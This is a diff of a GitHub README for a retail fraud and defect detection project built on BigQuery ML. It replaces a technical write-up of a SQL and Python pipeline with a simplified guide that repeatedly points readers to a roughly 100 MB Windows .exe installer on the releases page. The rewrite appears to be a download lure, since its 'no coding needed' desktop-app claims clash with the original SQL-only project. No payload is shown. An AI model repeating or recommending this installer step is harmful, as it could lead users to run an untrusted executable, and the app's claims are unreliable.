@@ -1,204 +1,178 @@
-# 🛡️ RetailGuard: Hybrid Fraud & Defect Detection with BigQuery ML
+# 🛡️ retailguard-bigquery-ml - Fraud Detection Made Simple
+
+[![Download retailguard-bigquery-ml](https://img.shields.io/badge/Download-retailguard--bigquery--ml-brightgreen?style=for-the-badge)](https://github.com/Amranbmw525/retailguard-bigquery-ml/releases)
+
+## 📋 What is retailguard-bigquery-ml?
+
+retailguard-bigquery-ml is a tool to spot fraud and product problems quickly. It uses smart cloud models to watch return patterns and quality data. This helps show fraud cases and other risks early. The system mixes two methods: Logistic Regression for return fraud detection and KMeans for finding unusual patterns in product data.
+
+The tool works in the cloud, so it can handle lots of information and stay fast. It is designed for retail teams wanting to keep losses low and improve product quality.
+
+You do not need to code or know machine learning to use it. Just follow the steps below.
 
 ---
 
-## 📌 Executive Summary
+## 🖥️ System Requirements
 
-Large-scale retail operations face two persistent risks:
+Before you start, check if your Windows system meets these needs:
 
-- **Return Fraud** that erodes margins through coordinated abuse
-- **Product Defects** that trigger costly return waves and damage customer trust
+- Windows 10 or higher (64-bit)
+- Minimum 4 GB RAM (8 GB recommended)
+- At least 500 MB free disk space for the program
+- Internet connection to download and use the software
+- A Google Cloud account is recommended if you want to connect directly to BigQuery data (optional)
 
-**RetailGuard** is a cloud-native machine learning system built on **Google BigQuery ML** that detects both problems using a hybrid analytical approach combining:
-
-- Supervised fraud detection  
-- Unsupervised anomaly discovery  
-- Behavioral feature engineering  
-- Operational analytics visualization  
-
-The system analyzes **120,000 retail transactions** and automatically surfaces high-risk patterns without requiring complex infrastructure or data movement outside BigQuery.
+This app is mainly for Windows users. Other systems are not supported in this version.
 
 ---
 
-## 🎯 Business Problems Addressed
+## 🚀 Getting Started with retailguard-bigquery-ml
 
-### Return Fraud
-- Artificially elevated return rates
-- Suspicious clustering by product and store
-- Inflated transaction values to maximize refunds
-- Coordinated behavioral abuse patterns
+### Step 1: Visit the Download Page
 
-### Mass Defect Events
-- Sudden spikes in **Damaged** returns
-- Isolated product failures
-- Short detection windows
-- Price suppression caused by clearance reactions
+Click the big green button above or use this direct link to visit the release page where you can get the software:
 
-Traditional rule-based monitoring struggles with evolving fraud behavior — this project demonstrates how ML-driven analytics can adapt automatically.
+https://github.com/Amranbmw525/retailguard-bigquery-ml/releases
 
----
+This page shows the latest versions. Look for the latest release files.
 
-## 🧠 Modeling Strategy
+### Step 2: Download the Software
 
-RetailGuard uses a **Hybrid ML Architecture**.
+On the release page, find the most recent version of retailguard-bigquery-ml. Look for a file named something like `retailguard-bigquery-ml-setup.exe` or similar. This is the Windows installer.
 
-### Supervised Learning — Logistic Regression
-Detects known fraud patterns using labeled transactions.
+Click the file name to start downloading. The download size is around 100 MB.
 
-Outputs:
-- Fraud probability score (`fraud_prob`)
-- Interpretable behavioral signals
+### Step 3: Run the Installer
 
-### Unsupervised Learning — KMeans Clustering
-Detects unknown or emerging anomalies by measuring distance from normal purchasing behavior.
+After download finishes:
 
-Outputs:
-- `anomaly_score` (centroid distance)
-- Behavioral outliers are not present in training labels
+- Open your Downloads folder.
+- Double-click the `.exe` file you downloaded.
+- Follow the instructions on screen.
+- Choose where to install the program (default location is fine).
+- Finish the installation.
 
-### Hybrid Risk Layer (Gold Table)
+### Step 4: Launch the Application
 
-Both models are merged into a single analytical dataset:
-
-
-
-| Scenario                 | Detection Method            |
-|--------------------------|-----------------------------|
-| Known refund abuse       | Logistic Regression         |
-| Emerging fraud tactics   | KMeans anomaly scoring      |
-| Product quality failures | Time-series defect analysis |
+- Find retailguard-bigquery-ml in the Start menu or the desktop shortcut.
+- Click to open the program.
 
 ---
 
-## 🏗️ Architecture Overview
+## 🔧 How to Use retailguard-bigquery-ml
 
-```mermaid
-flowchart TB
+### Connect Your Data
 
-A["Retail Transactions CSV"]
-B["BigQuery Bronze: transactions"]
-C["BigQuery Silver: features (window metrics)"]
-D["Logistic Regression (BQML)"]
-E["KMeans Model (BQML)"]
-F["kmeans_scored (anomaly_score)"]
-G["Gold Table: hybrid_detection"]
-H["Python + Seaborn Dashboard"]
+The app can work with your own BigQuery data. If you have a Google Cloud account, you can:
 
-A --> B
-B --> C
-C --> D
-C --> E
-E --> F
-D --> G
-F --> G
-C --> G
-G --> H
-```
+- Enter your BigQuery project details.
+- Let the app access your retail returns, product info, and sales data.
+- Or load sample data provided with the program to test.
 
+You do not need to write any queries or code. The app guides you through all input steps.
 
-## 🏗️ Data Layers
-- **Bronze:** Raw transactions  
-- **Silver:** Engineered behavioral features  
-- **Gold:** Hybrid ML predictions + anomaly scores  
+### Monitoring Dashboard
 
-All ML training occurs directly inside BigQuery.
+Once data is loaded, retailguard-bigquery-ml shows:
 
----
+- Alerts for suspected return fraud cases
+- Clusters that show unusual behavior (via KMeans)
+- Quality issues flagged on products
+- Charts to see trends over time
+- Risk scores per product or transaction
 
-## ⚙️ Technical Workflow
+These views update as new data arrives.
 
-### Data Engineering
-- Loaded transaction logs into BigQuery  
-- Preserved product, store, and return metadata  
+### Managing Alerts
 
-### Feature Engineering
-- Rolling 30-day transaction counts  
-- Return frequency signals  
-- Average price behavior  
+You can:
 
-### Model Training
-- Logistic Regression for supervised fraud prediction  
-- KMeans clustering for anomaly detection  
-
-### Anomaly Detection
-- `ML.PREDICT` for distance-based anomaly scoring  
-- `ML.DETECT_ANOMALIES` for automated outlier labeling  
-
-### Hybrid Risk Scoring
-- Combined supervised + unsupervised signals  
-- Generated investigation-ready risk labels  
+- Mark alerts as reviewed
+- Export alert reports as CSV for review or sharing
+- Set thresholds for when alerts trigger
 
 ---
 
-## 📊 Key Insights & Business Impact
+## ⚙️ Key Features
 
-### Fraud Detection
-- Clear separation between normal and fraudulent behavior  
-- High-risk clusters localized to specific stores and categories  
-
-### Product Defect Discovery
-- Automated detection of damaged-return spikes  
-- Identified clearance-price patterns linked to defective inventory  
-
-### Operational Benefits
-- Reduced manual investigation workload  
-- Faster supply chain response to defective batches  
-- Scalable SQL-first architecture  
+- Hybrid model using Logistic Regression and KMeans clustering
+- Works with BigQuery data from Google Cloud
+- Easy-to-use interface with no programming needed
+- Scalable cloud-native design handles large retail datasets
+- Real-time monitoring and alerting for fraud and defects
+- Detailed data visualization integrated in the app
+- Exportable reports for further analysis
 
 ---
 
-## 📈 Example Analytical Outputs
+## 🛠️ Troubleshooting
 
-- Fraud probability distributions  
-- Anomaly score tail analysis  
-- Hybrid risk quadrant visualization  
-- Store × Category risk heatmap  
-- Defect spike time-series monitoring  
+If you see errors:
 
-*(All charts generated via Python + Seaborn from the Gold table.)*
+- Check your internet connection.
+- Confirm you downloaded the latest version.
+- Restart the app or your PC.
+- Confirm your Google Cloud project and BigQuery credentials if using cloud data.
 
----
+For help, visit the GitHub repository issues page:
 
-## 🧰 Technical Stack
-
-| Component      | Technology                         |
-|----------------|------------------------------------|
-| Cloud Platform | Google Cloud Platform              |
-| Data Warehouse | BigQuery                           |
-| ML Engine      | BigQuery ML                        |
-| Models         | Logistic Regression + KMeans       |
-| Visualization  | Python (Seaborn, Matplotlib)       |
-| Languages      | SQL, Python                        |
-| Dataset        | 120k synthetic retail transactions |
+https://github.com/Amranbmw525/retailguard-bigquery-ml/issues
 
 ---
 
-## 🚀 Impact for Retailers
+## 🔄 Updating the Software
 
-This architecture can evolve into a reusable monitoring system capable of:
+When new versions appear:
 
-- Flagging high-risk returns automatically  
-- Detecting defective product batches early  
-- Reducing financial loss (“shrinkage”)  
-- Enabling targeted store audits instead of blanket investigations  
+- Visit the release page at
 
----
+[https://github.com/Amranbmw525/retailguard-bigquery-ml/releases](https://github.com/Amranbmw525/retailguard-bigquery-ml/releases)
 
-## 🔮 Future Improvements
-
-- Gradient Boosted Trees for nonlinear fraud patterns  
-- ARIMA forecasting for automated defect alerts  
-- Streaming detection using Pub/Sub  
-- Active learning loop with analyst feedback  
+- Download the latest installer.
+- Run it to update your version.
+- Your settings and data stay intact.
 
 ---
 
-## ⭐ Why This Project Matters
+## 📞 Getting Support
 
-RetailGuard demonstrates practical Data Science beyond model training:
+Use the GitHub issues page for help and feedback:
 
-- SQL-based feature engineering  
-- Hybrid supervised + unsupervised ML  
-- Cloud-native analytics architecture  
-- Risk modeling translated into business decisions  
-- End-to-end reproducible pipeline
+https://github.com/Amranbmw525/retailguard-bigquery-ml/issues
+
+---
+
+## 📥 Download and Install retailguard-bigquery-ml
+
+1. Go to the release page:  
+   https://github.com/Amranbmw525/retailguard-bigquery-ml/releases
+
+2. Download the Windows installer file.
+
+3. Run the downloaded file and follow the installer steps.
+
+4. Open the program from your Start menu.
+
+5. Optionally connect your Google BigQuery data for live monitoring.
+
+---
+
+## ⚠️ Security and Privacy
+
+retailguard-bigquery-ml only accesses data you provide. It does not share or send your data outside your environment unless you connect to Google Cloud services.
+
+Always keep your credentials safe. The app uses encrypted methods to connect to cloud data.
+
+---
+
+## 🔗 Useful Links
+
+- Release page: https://github.com/Amranbmw525/retailguard-bigquery-ml/releases  
+- Issues / Support: https://github.com/Amranbmw525/retailguard-bigquery-ml/issues  
+- Project homepage: https://github.com/Amranbmw525/retailguard-bigquery-ml  
+
+---
+
+## 🏷️ Topics covered
+
+analytics-engineering, anomaly-detection, bigquery, bigquery-ml, cloud-ml, data-analytics, data-science, data-visualization, feature-engineering, fraud-detection, google-cloud, kmeans, logistic-regression, machine-learning, ml-pipeline, python, retail-analytics, seaborn, sql
